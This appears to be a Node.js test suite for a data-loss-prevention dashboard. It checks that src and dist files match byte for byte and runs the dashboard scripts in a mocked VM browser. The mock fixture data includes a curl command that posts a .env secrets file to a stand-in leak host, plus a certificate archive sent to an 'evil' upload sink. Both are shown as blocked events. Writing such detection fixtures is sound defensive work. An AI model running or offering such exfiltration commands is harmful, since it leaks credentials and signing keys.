import { describe, it } from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import vm from 'node:vm';

describe('Milestone 4 Adversarial Parity and VM Runtime Integrity Challenge', () => {
    const srcDir = path.resolve('dashboard/src');
    const distDir = path.resolve('dashboard/dist');

    // ------------------------------------------------------------------------
    // Challenge 1: Exhaustive Recursive File Hash and Length Equality
    // ------------------------------------------------------------------------
    it('should assert byte-for-byte SHA-256 and byte-length equality across every single file', () => {
        function getFilesRecursively(dir) {
            let results = [];
            const list = fs.readdirSync(dir, { withFileTypes: true });
            for (const dirent of list) {
                const fullPath = path.join(dir, dirent.name);
                if (dirent.isDirectory()) {
                    results = results.concat(getFilesRecursively(fullPath));
                } else {
                    results.push(fullPath);
                }
            }
            return results;
        }

        const srcFiles = getFilesRecursively(srcDir).map(f => path.relative(srcDir, f)).sort();
        const distFiles = getFilesRecursively(distDir).map(f => path.relative(distDir, f)).sort();

        assert.deepStrictEqual(srcFiles, distFiles, 'Files in src and dist must match exactly in structure and count');
        assert.ok(srcFiles.length >= 12, `Expected at least 12 files, found ${srcFiles.length}`);

        for (const rel of srcFiles) {
            const srcPath = path.join(srcDir, rel);
            const distPath = path.join(distDir, rel);

            const srcBuffer = fs.readFileSync(srcPath);
            const distBuffer = fs.readFileSync(distPath);

            assert.strictEqual(
                srcBuffer.length,
                distBuffer.length,
                `Byte length mismatch in ${rel}: src=${srcBuffer.length}, dist=${distBuffer.length}`
            );

            const srcHash = crypto.createHash('sha256').update(srcBuffer).digest('hex');
            const distHash = crypto.createHash('sha256').update(distBuffer).digest('hex');

            assert.strictEqual(
                srcHash,
                distHash,
                `SHA-256 hash mismatch in ${rel}: src=${srcHash}, dist=${distHash}`
            );
        }
    });

    // ------------------------------------------------------------------------
    // Challenge 2: Collapsible Data Lineage Section in index.html (DOM Structure)
    // ------------------------------------------------------------------------
    it('should verify collapsible data lineage section structure in index.html', () => {
        for (const target of ['src', 'dist']) {
            const html = fs.readFileSync(path.join('dashboard', target, 'index.html'), 'utf8');

            // Must contain collapsible details element without 'open' attribute (collapsed by default)
            assert.ok(
                html.includes('<details id="dlp-lineage-details"'),
                `dashboard/${target}/index.html must contain collapsed <details id="dlp-lineage-details">`
            );
            assert.ok(
                !html.includes('<details id="dlp-lineage-details" open'),
                `dashboard/${target}/index.html <details id="dlp-lineage-details"> must not be open by default`
            );

            // KPI summary badges inside summary
            assert.ok(html.includes('id="lineage-kpi-traces"'), 'Must have #lineage-kpi-traces');
            assert.ok(html.includes('id="lineage-kpi-hops"'), 'Must have #lineage-kpi-hops');
            assert.ok(html.includes('id="lineage-kpi-blocked"'), 'Must have #lineage-kpi-blocked');
            assert.ok(html.includes('id="lineage-kpi-spanlinks"'), 'Must have #lineage-kpi-spanlinks');

            // 3-column container and grid elements
            assert.ok(html.includes('id="dlp-lineage-filter"'), 'Must have #dlp-lineage-filter');
            assert.ok(html.includes('id="dlp-lineage-rows-container"'), 'Must have #dlp-lineage-rows-container');
            assert.ok(html.includes('id="dlp-lineage-empty"'), 'Must have #dlp-lineage-empty');
            assert.ok(html.includes('id="btn-verify-multi-hop"'), 'Must have #btn-verify-multi-hop');

            // OpenLineage JSON drawer
            assert.ok(html.includes('id="dlp-openlineage-json-details"'), 'Must have #dlp-openlineage-json-details');
            assert.ok(html.includes('id="openlineage-json-preview"'), 'Must have #openlineage-json-preview');
            assert.ok(html.includes('id="openlineage-json-event-id"'), 'Must have #openlineage-json-event-id');
        }
    });

    // ------------------------------------------------------------------------
    // Challenge 3: Isolated VM Evaluation of app.js and views/dlp.js
    // ------------------------------------------------------------------------
    function createMockBrowser() {
        const domRegistry = {};
        const mockEl = (id = '') => ({
            id,
            tagName: 'DIV',
            style: {},
            classList: {
                _classes: new Set(),
                contains(c) { return this._classes.has(c); },
                add(c) { this._classes.add(c); },
                remove(c) { this._classes.delete(c); },
                toggle(c) { this._classes.has(c) ? this._classes.delete(c) : this._classes.add(c); }
            },
            innerHTML: '',
            innerText: '',
            textContent: '',
            value: '',
            dataset: {},
            childNodes: [],
            children: [],
            appendChild(c) { this.childNodes.push(c); this.children.push(c); return c; },
            removeChild(c) { return c; },
            querySelectorAll: () => [],
            querySelector: () => null,
            addEventListener: () => {},
            removeEventListener: () => {},
            setAttribute: () => {},
            getAttribute: () => null,
            click: () => {}
        });

        const mockDoc = {
            readyState: 'complete',
            body: mockEl('body'),
            getElementById(id) {
                if (!domRegistry[id]) domRegistry[id] = mockEl(id);
                return domRegistry[id];
            },
            querySelector(sel) {
                if (sel && sel.startsWith('#')) return this.getElementById(sel.slice(1));
                return mockEl(sel);
            },
            querySelectorAll: () => [],
            createElement: (t) => mockEl(t),
            addEventListener: () => {}
        };

        const mockWin = {
            document: mockDoc,
            localStorage: {
                _store: { 'oshoosi_logged_in': 'true' },
                getItem(k) { return this._store[k] ?? null; },
                setItem(k, v) { this._store[k] = String(v); },
                removeItem(k) { delete this._store[k]; },
                clear() { this._store = {}; }
            },
            sessionStorage: {
                _store: {},
                getItem(k) { return this._store[k] ?? null; },
                setItem(k, v) { this._store[k] = String(v); }
            },
            location: {
                protocol: 'http:',
                host: '127.0.0.1:3030',
                hostname: '127.0.0.1',
                port: '3030',
                pathname: '/',
                search: '',
                hash: '#dlp',
                href: 'http://127.0.0.1:3030/#dlp'
            },
            navigator: {
                userAgent: 'NodeVM-Adversarial/1.0',
                clipboard: {
                    _text: '',
                    writeText: async function(t) { this._text = t; return Promise.resolve(); }
                }
            },
            addEventListener: () => {},
            removeEventListener: () => {},
            setTimeout: (fn) => 1,
            clearTimeout: () => {},
            setInterval: (fn) => 2,
            clearInterval: () => {},
            fetch: async (url, opts) => {
                const urlStr = String(url);
                if (urlStr.includes('/api/dlp/lineage/ingest') || urlStr.includes('/dlp/lineage/ingest')) {
                    return {
                        ok: true,
                        status: 200,
                        json: async () => ({
                            status: 'ok',
                            taint_propagated: true,
                            action: 'BLOCKED',
                            trace_id: '4bf92f3577b34da6a3ce929d0e0e4736',
                            span_id: '00f067aa0ba902b7'
                        })
                    };
                }
                if (urlStr.includes('/api/dlp/lineage') || urlStr.includes('/dlp/lineage')) {
                    return {
                        ok: true,
                        status: 200,
                        json: async () => ({
                            status: 'ok',
                            summary: {
                                active_tainted_traces: 2,
                                osquery_har_hops: 4,
                                blocked_derived_egresses: 1,
                                span_links_merged: 2
                            },
                            lineage_events: [
                                {
                                    run_id: 'run-1',
                                    trace_id: '4bf92f3577b34da6a3ce929d0e0e4736',
                                    span_id: '00f067aa0ba902b7',
                                    event_type: 'COMPLETE',
                                    event_time: '2026-10-26T21:00:00Z',
                                    span_links: [
                                        { trace_id: '4bf92f3577b34da6a3ce929d0e0e4736', span_id: '5c3a4f89d1234567' }
                                    ],
                                    job: {
                                        name: '7z.exe',
                                        pid: 8412,
                                        process_start_time: 13374291000,
                                        command_line: '7z.exe a archive.7z key.pfx',
                                        span_links_count: 1,
                                        open_files: ['C:\\certs\\OshoosiClaw_Signing.pfx']
                                    },
                                    inputs: [
                                        {
                                            name: 'certs/OshoosiClaw_Signing.pfx',
                                            path: 'certs/OshoosiClaw_Signing.pfx',
                                            sha256: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
                                            classification: 'CROWN_JEWEL'
                                        }
                                    ],
                                    outputs: [
                                        {
                                            name: 'https://evil.exfil.org/upload',
                                            egress_sink: 'https://evil.exfil.org/upload',
                                            action: 'BLOCKED',
                                            policy: 'QUARANTINE',
                                            w3c_baggage: 'dlp.classification=CROWN_JEWEL,dlp.policy=QUARANTINE'
                                        }
                                    ]
                                },
                                {
                                    run_id: 'run-2',
                                    trace_id: '8a3ce929d0e0e47364bf92f3577b34da',
                                    span_id: 'ba902b700f067aa0',
                                    event_type: 'COMPLETE',
                                    event_time: '2026-10-26T21:05:00Z',
                                    span_links: [],
                                    job: {
                                        name: 'curl.exe',
                                        pid: 9912,
                                        process_start_time: 13374292000,
                                        command_line: 'curl -X POST https://api.leak.com --data @.env',
                                        span_links_count: 0,
                                        open_files: ['.env']
                                    },
                                    inputs: [
                                        {
                                            name: '.env',
                                            path: '.env',
                                            sha256: 'c4ca4238a0b923820dcc509a6f75849b2a7c4a17953ff5c13dc1e85501861053',
                                            classification: 'CONFIDENTIAL'
                                        }
                                    ],
                                    outputs: [
                                        {
                                            name: 'https://api.leak.com',
                                            egress_sink: 'https://api.leak.com',
                                            action: 'BLOCKED',
                                            policy: 'BLOCK'
                                        }
                                    ]
                                }
                            ]
                        }),
                        text: async () => '{"status":"ok"}'
                    };
                }
                if (urlStr.includes('/api/dlp/status') || urlStr.includes('/dlp/status')) {
                    return {
                        ok: true,
                        status: 200,
                        json: async () => ({
                            policy_mode: 'ENFORCE_BLOCK_AND_SCRUB',
                            inspected_count: 42,
                            blocked_count: 5,
                            scrubbed_count: 12,
                            zk_proofs_verified: 38,
                            attacker_exfil_bytes: 0,
                            lineage_tracked_count: 2
                        })
                    };
                }
                if (urlStr.includes('/dlp/release')) {
                    return {
                        ok: true,
                        status: 200,
                        json: async () => ({ status: 'ok', released_count: 1 })
                    };
                }
                return {
                    ok: true,
                    status: 200,
                    json: async () => ({ status: 'ok', data: [] }),
                    text: async () => '{"status":"ok"}'
                };
            },
            lucide: { createIcons: () => {} },
            vis: {
                Network: function() { return { destroy: () => {}, on: () => {}, fit: () => {} }; },
                DataSet: function(a) { return { get: () => a || [], add: () => {}, update: () => {}, clear: () => {} }; }
            },
            Chart: function() { return { update: () => {}, destroy: () => {} }; },
            EventSource: class { constructor() {} addEventListener() {} close() {} },
            Blob: class { constructor(parts) { this.parts = parts; } },
            URL: { createObjectURL: () => 'blob:test', revokeObjectURL: () => {} },
            console
        };
        mockWin.window = mockWin;
        return { mockWin, mockDoc };
    }

    for (const target of ['src', 'dist']) {
        describe(`Target: dashboard/${target}`, () => {
            const baseDir = path.resolve(`dashboard/${target}`);

            it('should evaluate app.js and views/dlp.js in sequence without ReferenceError or SyntaxError', () => {
                const { mockWin } = createMockBrowser();
                const ctx = vm.createContext(mockWin);

                const appCode = fs.readFileSync(path.join(baseDir, 'app.js'), 'utf8');
                const dlpCode = fs.readFileSync(path.join(baseDir, 'views', 'dlp.js'), 'utf8');

                assert.doesNotThrow(() => {
                    vm.runInContext(appCode, ctx, { filename: `${target}/app.js` });
                }, `Evaluating app.js in ${target} threw an error`);

                assert.doesNotThrow(() => {
                    vm.runInContext(dlpCode, ctx, { filename: `${target}/views/dlp.js` });
                }, `Evaluating views/dlp.js in ${target} threw an error`);
            });

            it('should export all required DLP and Lineage symbols on window and window.osoosiDlp', () => {
                const { mockWin } = createMockBrowser();
                const ctx = vm.createContext(mockWin);

                const appCode = fs.readFileSync(path.join(baseDir, 'app.js'), 'utf8');
                const dlpCode = fs.readFileSync(path.join(baseDir, 'views', 'dlp.js'), 'utf8');

                vm.runInContext(appCode, ctx, { filename: `${target}/app.js` });
                vm.runInContext(dlpCode, ctx, { filename: `${target}/views/dlp.js` });

                // Standard DLP exports
                const requiredDlp = [
                    'renderDlpView',
                    'submitDlpInspection',
                    'loadDlpSamplePayload',
                    'handleDlpInspectFileUpload',
                    'handleDlpCrownJewelFileUpload',
                    'registerDlpCrownJewel',
                    'testCrownJewelExfilBlock',
                    'runDlpLiveHarSweep',
                    'runDlpExfilSimulationGauntlet',
                    'updateDlpPolicyMode',
                    'onDlpFilterChange',
                    'applyDlpAutonomyPreset',
                    'saveCustomDlpAutonomySettings',
                    'syncDlpAutonomyCardsFromPolicy'
                ];
                for (const fn of requiredDlp) {
                    assert.strictEqual(
                        typeof mockWin[fn],
                        'function',
                        `Expected window.${fn} to be a function in dashboard/${target}`
                    );
                }

                // Lineage exports
                const requiredLineage = [
                    'fetchDlpLineage',
                    'renderDlpLineage',
                    'renderDlpLineageSection',
                    'verifyMultiHopTrace',
                    'triggerMultiHopVerification',
                    'verifySpecificTrace',
                    'previewOpenLineageRunEvent',
                    'copyOpenLineageJson',
                    'exportDlpLineageJson',
                    'onLineageFilterChange'
                ];
                for (const fn of requiredLineage) {
                    assert.strictEqual(
                        typeof mockWin[fn],
                        'function',
                        `Expected window.${fn} to be a function in dashboard/${target}`
                    );
                }

                // window.osoosiDlp object exports
                assert.ok(
                    mockWin.osoosiDlp && typeof mockWin.osoosiDlp === 'object',
                    `Expected window.osoosiDlp to be an object in dashboard/${target}`
                );

                const requiredOsoosiDlp = [
                    'releaseEvent',
                    'releaseAllFalsePositives',
                    'refreshStatus',
                    'fetchLineage',
                    'renderLineage',
                    'verifyTrace',
                    'rejectRateLimit',
                    'startPolling',
                    'stopPolling'
                ];
                for (const fn of requiredOsoosiDlp) {
                    assert.strictEqual(
                        typeof mockWin.osoosiDlp[fn],
                        'function',
                        `Expected window.osoosiDlp.${fn} to be a function in dashboard/${target}`
                    );
                }
            });

            it('should execute dynamic lineage lifecycle methods without runtime faults', async () => {
                const { mockWin, mockDoc } = createMockBrowser();
                const ctx = vm.createContext(mockWin);

                const appCode = fs.readFileSync(path.join(baseDir, 'app.js'), 'utf8');
                const dlpCode = fs.readFileSync(path.join(baseDir, 'views', 'dlp.js'), 'utf8');

                vm.runInContext(appCode, ctx, { filename: `${target}/app.js` });
                vm.runInContext(dlpCode, ctx, { filename: `${target}/views/dlp.js` });

                // 1. Fetch Lineage JSON response
                const fetched = await mockWin.fetchDlpLineage();
                assert.ok(fetched && typeof fetched === 'object', 'fetchDlpLineage must return object');
                assert.ok(Array.isArray(fetched.lineage_events), 'fetchDlpLineage response must contain lineage_events');
                assert.strictEqual(fetched.lineage_events.length, 2, 'Must have fetched 2 traces');

                // 2. Render Lineage
                await mockWin.renderDlpLineage(true);

                // Verify KPI counters updated
                const tracesKpi = mockDoc.getElementById('lineage-kpi-traces');
                const hopsKpi = mockDoc.getElementById('lineage-kpi-hops');
                const blockedKpi = mockDoc.getElementById('lineage-kpi-blocked');
                const linksKpi = mockDoc.getElementById('lineage-kpi-spanlinks');

                assert.strictEqual(tracesKpi.innerText, '2');
                assert.strictEqual(hopsKpi.innerText, '4');
                assert.strictEqual(blockedKpi.innerText, '1');
                assert.strictEqual(linksKpi.innerText, '2');

                // Verify 3-column container was rendered
                const containerEl = mockDoc.getElementById('dlp-lineage-rows-container');
                assert.ok(containerEl.innerHTML.includes('InputDataset'), 'Must render InputDataset column');
                assert.ok(containerEl.innerHTML.includes('Job (PID/Agent)'), 'Must render Job column');
                assert.ok(containerEl.innerHTML.includes('OutputDataset / Sink'), 'Must render OutputDataset column');
                assert.ok(containerEl.innerHTML.includes('4bf92f3577b34da6a3ce929d0e0e4736'), 'Must render TraceId');
                assert.ok(containerEl.innerHTML.includes('7z.exe'), 'Must render process name 7z.exe');
                assert.ok(containerEl.innerHTML.includes('CROWN_JEWEL'), 'Must render CROWN_JEWEL classification badge');

                // 3. Multi-hop trace verification
                const traceResult = await mockWin.verifyMultiHopTrace();
                assert.ok(traceResult && typeof traceResult === 'object', 'verifyMultiHopTrace must succeed');
                assert.strictEqual(traceResult.trace_id, '4bf92f3577b34da6a3ce929d0e0e4736');
                assert.strictEqual(traceResult.event_type, 'COMPLETE');
                assert.strictEqual(traceResult.outputs[0].action, 'BLOCKED');

                // 4. OpenLineage JSON Preview
                mockWin.previewOpenLineageRunEvent(0, true);
                const previewEl = mockDoc.getElementById('openlineage-json-preview');
                assert.ok(previewEl.innerText.length > 50, 'previewEl must contain JSON string');
                const parsed = JSON.parse(previewEl.innerText);
                assert.strictEqual(parsed.eventType, 'COMPLETE');
                assert.ok(parsed.job.name.includes('7z.exe'), 'Job name must include 7z.exe');
                assert.ok(parsed.inputs[0].name.includes('secret.docx') || parsed.inputs[0].name.includes('certs'), 'Input must be secret.docx or certs');
                assert.ok(parsed.outputs[0].name.includes('upload'), 'Output must be upload URL or sink');

                // 5. Copy OpenLineage JSON
                mockWin.copyOpenLineageJson();
                assert.ok(mockWin.navigator.clipboard._text.includes('COMPLETE'), 'Clipboard must receive JSON');

                // 6. Filter change
                mockWin.onLineageFilterChange('curl');
                assert.ok(containerEl.innerHTML.includes('curl.exe'), 'Must match filtered curl.exe');
                assert.ok(!containerEl.innerHTML.includes('7z.exe'), 'Must filter out 7z.exe');

                // Reset filter
                mockWin.onLineageFilterChange('');
                assert.ok(containerEl.innerHTML.includes('7z.exe'), 'Must restore 7z.exe when filter cleared');

                // 7. Polling start and stop
                mockWin.osoosiDlp.startPolling();
                mockWin.osoosiDlp.stopPolling();
            });
        });
    }
});
